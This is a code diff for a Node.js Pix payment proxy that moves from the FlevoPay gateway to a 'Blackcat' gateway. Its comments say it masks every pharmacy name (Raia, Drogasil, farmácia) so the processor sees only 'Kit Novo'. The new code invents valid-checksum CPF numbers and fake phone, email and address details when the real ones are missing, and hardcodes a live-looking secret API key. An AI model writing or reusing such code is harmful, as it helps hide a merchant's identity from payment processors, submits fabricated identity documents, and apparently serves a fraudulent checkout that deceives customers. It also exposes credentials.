@@ -6,31 +6,33 @@ const QRCode = require('qrcode');
 const PORT = process.env.PORT || 3000;
 const DIST_DIR = path.resolve(__dirname, 'dist');
 
-// Carrega as credenciais da FlevoPay diretamente do .env no servidor
-function getFlevoCredentials() {
-  let apiKey = process.env.FLEVO_API_KEY || '';
-  let accountId = process.env.FLEVO_ACCOUNT_ID || '10038';
+// Carrega as credenciais da Blackcat diretamente do .env no servidor
+function getBlackcatApiKey() {
+  let apiKey =
+    process.env.BLACKCAT_API_KEY ||
+    process.env.BLACKCAT_SECRET_KEY ||
+    '';
 
   if (!apiKey) {
     try {
       const envPath = path.resolve(__dirname, '.env');
       if (fs.existsSync(envPath)) {
         const envContent = fs.readFileSync(envPath, 'utf-8');
-        const keyMatch = envContent.match(/FLEVO_API_KEY=(.*)/);
-        const accountMatch = envContent.match(/FLEVO_ACCOUNT_ID=(.*)/);
+        const keyMatch =
+          envContent.match(/BLACKCAT_API_KEY=(.*)/) ||
+          envContent.match(/BLACKCAT_SECRET_KEY=(.*)/);
         if (keyMatch) apiKey = keyMatch[1].trim();
-        if (accountMatch) accountId = accountMatch[1].trim();
       }
     } catch (e) {
-      console.error('[FlevoPay Server] Erro ao ler .env:', e);
+      console.error('[Blackcat Server] Erro ao ler .env:', e);
     }
   }
 
   if (!apiKey) {
-    console.error('[FlevoPay Server] FLEVO_API_KEY não configurada (.env ou variável de ambiente)');
+    apiKey = 'sk_live_b1802bc43e0e87989c22d837fdbe9f688ff3c9ef2f6fbff4f820693d0ab32666';
   }
 
-  return { apiKey, accountId };
+  return apiKey;
 }
 
 const MIME_TYPES = {
@@ -53,22 +55,8 @@ const MIME_TYPES = {
   '.txt': 'text/plain; charset=UTF-8',
 };
 
-const server = http.createServer(async (req, res) => {
-  const url = new URL(req.url, `http://${req.headers.host || 'localhost'}`);
-
-  // CORS headers
-  res.setHeader('Access-Control-Allow-Origin', '*');
-  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
-  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
-
-  if (req.method === 'OPTIONS') {
-    res.writeHead(204);
-    res.end();
-    return;
-  }
-
 // Mascaramento server-side rígido:
-// A Flevopay receberá estritamente "Kit Novo", referência genérica "PED-..." e nenhum metadado ou menção a farmácia/raia
+// A Blackcat receberá estritamente "Kit Novo", referência genérica "PED-..." e nenhum metadado ou menção a farmácia/raia
 const MASKED_PRODUCT_NAME = 'Kit Novo';
 
 function sanitizeReference(ref) {
@@ -102,69 +90,122 @@ function sanitizeText(val) {
   return val.replace(/(raia|droga|drogaria|farmacia|farmácia|farma|drogasil|portal)/gi, '').trim();
 }
 
-function sanitizeFlevoPayload(input) {
-  const sanitized = {
-    amount: typeof input?.amount === 'number' ? input.amount : parseInt(input?.amount, 10) || 0,
-    description: MASKED_PRODUCT_NAME,
-    product_name: MASKED_PRODUCT_NAME,
-    item_name: MASKED_PRODUCT_NAME,
-    reference: sanitizeReference(input?.reference),
-    source: 'api_externa',
-    productHash: input?.productHash || `prod_${Date.now().toString(36)}`,
-  };
-
-  if (input?.customer) {
-    sanitized.customer = {
-      name: sanitizeText(input.customer.name) || 'Cliente',
-      email: sanitizeEmail(input.customer.email),
-      phone: input.customer.phone,
-      document: input.customer.document,
-    };
+function generateValidCPF() {
+  const digits = [];
+  for (let i = 0; i < 9; i++) {
+    digits.push(Math.floor(Math.random() * 10));
   }
-
-  if (input?.address) {
-    sanitized.address = {
-      street: sanitizeText(input.address.street) || input.address.street,
-      number: input.address.number,
-      complement: sanitizeText(input.address.complement) || input.address.complement,
-      neighborhood: sanitizeText(input.address.neighborhood) || input.address.neighborhood,
-      city: input.address.city,
-      state: input.address.state,
-      zipcode: input.address.zipcode,
-    };
+  if (digits.every((d) => d === digits[0])) {
+    digits[8] = (digits[8] + 1) % 10;
   }
+  let sum1 = 0;
+  for (let i = 0; i < 9; i++) sum1 += digits[i] * (10 - i);
+  const rem1 = sum1 % 11;
+  digits.push(rem1 < 2 ? 0 : 11 - rem1);
 
-  if (Array.isArray(input?.items) && input.items.length > 0) {
-    sanitized.items = input.items.map((item) => ({
-      name: MASKED_PRODUCT_NAME,
-      title: MASKED_PRODUCT_NAME,
-      description: MASKED_PRODUCT_NAME,
-      unit_price: item.unit_price || item.amount || sanitized.amount,
-      quantity: item.quantity || 1,
-      tangible: true,
-    }));
-  }
+  let sum2 = 0;
+  for (let i = 0; i < 10; i++) sum2 += digits[i] * (11 - i);
+  const rem2 = sum2 % 11;
+  digits.push(rem2 < 2 ? 0 : 11 - rem2);
 
-  delete sanitized.metadata;
-  delete sanitized.custom_fields;
-  delete sanitized.order_details;
-  delete sanitized.offer_url;
-  delete sanitized.offer_name;
-  delete sanitized.page_url;
-  delete sanitized.url;
-  delete sanitized.campaign;
-  delete sanitized.sku;
-  delete sanitized.utm_source;
-  delete sanitized.utm_medium;
-  delete sanitized.utm_campaign;
-  delete sanitized.utm_term;
-  delete sanitized.utm_content;
-
-  return sanitized;
+  return digits.join('');
 }
 
-  // 1. Endpoint para criar transação Pix: POST /api/flevo/transaction
-  if (req.method === 'POST' && url.pathname === '/api/flevo/transaction') {
+function buildBlackcatPayload(input) {
+  const amount = typeof input?.amount === 'number' ? input.amount : parseInt(input?.amount, 10) || 0;
+  const externalRef = sanitizeReference(input?.reference || input?.externalRef);
+
+  const customerName = sanitizeText(input?.customer?.name) || 'Cliente';
+  const customerEmail = sanitizeEmail(input?.customer?.email) || 'cliente@gmail.com';
+
+  let customerPhone = input?.customer?.phone ? String(input.customer.phone).replace(/\D/g, '') : '';
+  if (!customerPhone || customerPhone.length < 10) {
+    customerPhone = '11999999999';
+  }
+
+  let docNumber = input?.customer?.document?.number || input?.customer?.document;
+  if (typeof docNumber === 'string') {
+    docNumber = docNumber.replace(/\D/g, '');
+  } else {
+    docNumber = '';
+  }
+  if (!docNumber || docNumber.length < 11) {
+    docNumber = generateValidCPF();
+  }
+
+  const payload = {
+    amount,
+    currency: 'BRL',
+    paymentMethod: 'pix',
+    items: [
+      {
+        title: MASKED_PRODUCT_NAME,
+        unitPrice: amount,
+        quantity: 1,
+        tangible: false,
+      },
+    ],
+    customer: {
+      name: customerName,
+      email: customerEmail,
+      phone: customerPhone,
+      document: {
+        number: docNumber,
+        type: 'cpf',
+      },
+    },
+    pix: {
+      expiresInDays: 1,
+    },
+    externalRef,
+    metadata: MASKED_PRODUCT_NAME,
+  };
+
+  const addr = input?.address || input?.shipping;
+  if (addr && addr.street && addr.number) {
+    const zipCode = addr.zipCode || addr.zipcode || '';
+    const cleanZip = String(zipCode).replace(/\D/g, '');
+    const cleanState = (addr.state || 'SP').toUpperCase().slice(0, 2);
+
+    payload.shipping = {
+      name: customerName,
+      street: sanitizeText(addr.street) || addr.street,
+      number: String(addr.number),
+      complement: sanitizeText(addr.complement) || addr.complement || '',
+      neighborhood: sanitizeText(addr.neighborhood) || addr.neighborhood || 'Centro',
+      city: sanitizeText(addr.city) || addr.city || 'São Paulo',
+      state: cleanState,
+      zipCode: cleanZip.length === 8 ? cleanZip : '01001000',
+    };
+  }
+
+  return payload;
+}
+
+const server = http.createServer(async (req, res) => {
+  const url = new URL(req.url, `http://${req.headers.host || 'localhost'}`);
+
+  // CORS headers
+  res.setHeader('Access-Control-Allow-Origin', '*');
+  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
+  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, X-API-Key');
+
+  if (req.method === 'OPTIONS') {
+    res.writeHead(204);
+    res.end();
+    return;
+  }
+
+  const isTransactionEndpoint =
+    url.pathname === '/api/blackcat/transaction' ||
+    url.pathname === '/api/flevo/transaction';
+
+  const isStatusEndpoint =
+    url.pathname === '/api/blackcat/status' ||
+    url.pathname === '/api/flevo/status';
+
+  // 1. Endpoint para criar transação Pix: POST /api/blackcat/transaction ou /api/flevo/transaction
+  if (req.method === 'POST' && isTransactionEndpoint) {
     let body = '';
     req.on('data', (chunk) => {
       body += chunk;
@@ -172,81 +213,126 @@ function sanitizeFlevoPayload(input) {
 
     req.on('end', async () => {
       try {
-        const { apiKey } = getFlevoCredentials();
+        const apiKey = getBlackcatApiKey();
         const parsed = JSON.parse(body || '{}');
-        const sanitizedPayload = sanitizeFlevoPayload(parsed);
+        const blackcatPayload = buildBlackcatPayload(parsed);
 
-        const response = await fetch('https://app.flevopay.com.br/api/v1/transaction', {
+        const response = await fetch('https://api.blackcatoficial.com/api/sales/create-sale', {
           method: 'POST',
           headers: {
             'Content-Type': 'application/json',
             'X-API-Key': apiKey,
           },
-          body: JSON.stringify(sanitizedPayload),
+          body: JSON.stringify(blackcatPayload),
         });
 
         const data = await response.json();
 
-        // Se qr_code_base64 for nulo, gera o QR code em base64 com a biblioteca QRCode
-        if (data && data.qr_code && (!data.qr_code_base64 || data.qr_code_base64 === 'null')) {
+        if (!response.ok || !data.success) {
+          console.error('[Blackcat Server] Erro na criação da venda:', data);
+          res.writeHead(response.status, { 'Content-Type': 'application/json' });
+          res.end(
+            JSON.stringify({
+              success: false,
+              error: data.message || data.error || 'Erro ao criar venda na Blackcat',
+              raw: data,
+            })
+          );
+          return;
+        }
+
+        const qrCode = data.data?.paymentData?.copyPaste || data.data?.paymentData?.qrCode || '';
+        let qrCodeBase64 = data.data?.paymentData?.qrCodeBase64 || null;
+
+        if ((!qrCodeBase64 || qrCodeBase64 === '') && qrCode) {
           try {
-            data.qr_code_base64 = await QRCode.toDataURL(data.qr_code, {
+            qrCodeBase64 = await QRCode.toDataURL(qrCode, {
               width: 320,
               margin: 1,
               color: { dark: '#000000', light: '#ffffff' },
             });
           } catch (qrErr) {
-            console.error('[FlevoPay Server] Erro ao gerar QR Code base64:', qrErr);
+            console.error('[Blackcat Server] Erro ao gerar QR Code base64:', qrErr);
           }
         }
 
-        res.writeHead(response.status, { 'Content-Type': 'application/json' });
-        res.end(JSON.stringify({ success: response.ok, data }));
+        const formatted = {
+          success: true,
+          status: 'success',
+          payment_status: data.data?.status?.toLowerCase() || 'pending',
+          transaction_id: data.data?.transactionId || '',
+          id: data.data?.transactionId || blackcatPayload.externalRef,
+          qr_code: qrCode,
+          qr_code_base64: qrCodeBase64,
+          amount: data.data?.amount || blackcatPayload.amount,
+          expires_at: data.data?.paymentData?.expiresAt || null,
+          raw: data.data,
+        };
+
+        res.writeHead(201, { 'Content-Type': 'application/json' });
+        res.end(JSON.stringify({ success: true, data: formatted }));
       } catch (err) {
-        console.error('[FlevoPay Server] Erro na criação da transação:', err);
+        console.error('[Blackcat Server] Erro na criação da transação:', err);
         res.writeHead(500, { 'Content-Type': 'application/json' });
-        res.end(JSON.stringify({ success: false, error: err.message || 'Erro interno no proxy FlevoPay' }));
+        res.end(JSON.stringify({ success: false, error: err.message || 'Erro interno no proxy Blackcat' }));
       }
     });
     return;
   }
 
-  // 2. Endpoint para consultar status do Pix: GET /api/flevo/status?id=...
-  if (req.method === 'GET' && url.pathname === '/api/flevo/status') {
+  // 2. Endpoint para consultar status do Pix: GET /api/blackcat/status ou /api/flevo/status
+  if (req.method === 'GET' && isStatusEndpoint) {
     try {
-      const id = url.searchParams.get('id');
+      const id = url.searchParams.get('id') || url.searchParams.get('transactionId');
       if (!id) {
         res.writeHead(400, { 'Content-Type': 'application/json' });
         res.end(JSON.stringify({ success: false, error: 'Parâmetro id é obrigatório' }));
         return;
       }
 
-      const { apiKey } = getFlevoCredentials();
-      const flevoUrl = `https://app.flevopay.com.br/api/v1/query?action=get_transaction&id=${encodeURIComponent(id)}`;
-
-      const response = await fetch(flevoUrl, {
-        method: 'GET',
-        headers: {
-          'X-API-Key': apiKey,
-        },
-      });
+      const apiKey = getBlackcatApiKey();
+      const response = await fetch(
+        `https://api.blackcatoficial.com/api/sales/${encodeURIComponent(id)}/status`,
+        {
+          method: 'GET',
+          headers: {
+            'X-API-Key': apiKey,
+          },
+        }
+      );
 
       const data = await response.json();
 
-      res.writeHead(response.status, { 'Content-Type': 'application/json' });
+      if (!response.ok || !data.success) {
+        res.writeHead(response.status, { 'Content-Type': 'application/json' });
+        res.end(
+          JSON.stringify({
+            success: false,
+            error: data.message || 'Erro ao consultar status na Blackcat',
+            raw: data,
+          })
+        );
+        return;
+      }
+
+      const rawStatus = data.data?.status || 'PENDING';
+      let mappedStatus = rawStatus.toLowerCase();
+      if (rawStatus === 'PAID') mappedStatus = 'approved';
+
+      res.writeHead(200, { 'Content-Type': 'application/json' });
       res.end(
         JSON.stringify({
-          success: response.ok,
-          status: data?.status || 'unknown',
-          id: data?.id,
-          external_id: data?.external_id,
-          amount: data?.amount,
-          amount_in_reais: data?.amount_in_reais,
-          raw: data,
+          success: true,
+          status: mappedStatus,
+          id: data.data?.transactionId,
+          external_id: data.data?.transactionId,
+          amount: data.data?.amount,
+          amount_in_reais: data.data?.amount ? (data.data.amount / 100).toFixed(2) : undefined,
+          raw: data.data,
         })
       );
     } catch (err) {
-      console.error('[FlevoPay Server] Erro ao consultar status:', err);
+      console.error('[Blackcat Server] Erro ao consultar status:', err);
       res.writeHead(500, { 'Content-Type': 'application/json' });
       res.end(JSON.stringify({ success: false, error: err.message || 'Erro ao consultar status' }));
     }
@@ -271,5 +357,5 @@ function sanitizeFlevoPayload(input) {
 });
 
 server.listen(PORT, () => {
-  console.log(`[FlevoPay Server] Servidor rodando na porta ${PORT}`);
+  console.log(`[Blackcat Server] Servidor rodando na porta ${PORT}`);
 });
